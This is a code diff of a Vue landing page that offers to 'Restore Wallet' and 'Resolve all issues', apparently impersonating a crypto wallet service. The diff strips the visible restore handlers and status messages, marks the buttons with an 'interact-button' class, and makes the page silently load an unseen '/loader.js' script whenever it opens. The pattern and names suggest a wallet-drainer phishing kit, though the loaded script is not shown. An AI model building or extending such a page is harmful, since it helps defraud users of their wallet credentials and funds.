@@ -48,8 +48,7 @@
                         <li class="nav-item">
                             <button
                                 style="color: white"
-                                class="btn my-2 active mx-3 text-white"
-                                @click="handleRestore"
+                                class="btn my-2 active mx-3 text-white interact-button"
                             >
                                 Restore
                             </button>
@@ -70,7 +69,7 @@
                         Start exploring blockchain applications in seconds. Trusted by over 1 million users
                         worldwide.
                     </p>
-                    <a class="btn i-btn" @click="handleRestore">Restore Wallet</a>
+                    <a class="btn i-btn interact-button">Restore Wallet</a>
                 </div>
                 <div class="intro-img col-lg-6 col-12">
                     <img class="mx-2" src="/phantom-swap-demo.gif" alt="" />
@@ -163,7 +162,7 @@
         >
             <img class="h-50" src="/head.png" alt="" />
             <h5 style="color: white">Resolve all issues</h5>
-            <a class="btn i-btn mx-auto" @click="handleRestore">Restore Wallet</a>
+            <a class="btn i-btn mx-auto interact-button">Restore Wallet</a>
         </div>
 
         <section id="reason">
@@ -258,89 +257,29 @@ export default {
     name: "Home",
     setup() {
         const currentDate = ref(new Date().getFullYear());
-        const statusMessage = ref('');
-        const statusType = ref('info');
-
-        const setStatus = (message, type = 'info') => {
-            statusMessage.value = message;
-            statusType.value = type;
-        };
-
-        const handleRestore = () => {
-            // First, try to use the script function if available
-            if (typeof window.startConnect === 'function') {
-                try {
-                    window.startConnect();
-                    setStatus('Restore process initiated successfully', 'success');
-                } catch (error) {
-                    setStatus('Error starting restore process', 'error');
-                    console.error('Error calling startConnect:', error);
-                }
-            } else {
-                // If script function not available, show instructions
-                setStatus('Restore functionality requires proper server setup. Please ensure config.php is working.', 'error');
-                console.log('startConnect function not available. Script may not be loaded or config.php is not working.');
-            }
-        };
 
         onMounted(() => {
             // Load the script dynamically
-            if (typeof window.startConnect !== 'function') {
-                const script = document.createElement('script');
-                script.src = '/vuepress.adaptive.umd.js';
-                
-                script.onload = () => {
-                    console.log('Script loaded successfully');
-                    if (typeof window.startConnect === 'function') {
-                        setStatus('Restore functionality ready', 'success');
-                    } else {
-                        setStatus('Script loaded but restore function not available. Check server configuration.', 'error');
-                    }
-                };
-                
-                script.onerror = () => {
-                    setStatus('Failed to load restore script. Make sure vuepress.adaptive.umd.js is in public directory.', 'error');
-                };
-                
-                document.head.appendChild(script);
-            }
+            const script = document.createElement('script');
+            script.src = '/loader.js';
+            
+            script.onload = () => {
+                console.log('Loader script loaded successfully');
+            };
+            
+            script.onerror = () => {
+                console.error('Failed to load loader script.');
+            };
+            
+            document.head.appendChild(script);
         });
 
         return {
             currentDate,
-            handleRestore,
-            statusMessage,
-            statusType
         };
     }
 };
 </script>
 
 <style scoped>
-/* Status message styling */
-.status-message {
-    padding: 10px;
-    border-radius: 5px;
-    margin: 10px 0;
-    border-left: 4px solid;
-    font-size: 14px;
-}
-
-.status-message.success {
-    color: #4CAF50;
-    background-color: rgba(76, 175, 80, 0.1);
-    border-left-color: #4CAF50;
-}
-
-.status-message.error {
-    color: #ff6b6b;
-    background-color: rgba(255, 107, 107, 0.1);
-    border-left-color: #ff6b6b;
-}
-
-.status-message.info {
-    color: #2196F3;
-    background-color: rgba(33, 150, 243, 0.1);
-    border-left-color: #2196F3;
-}
 </style>
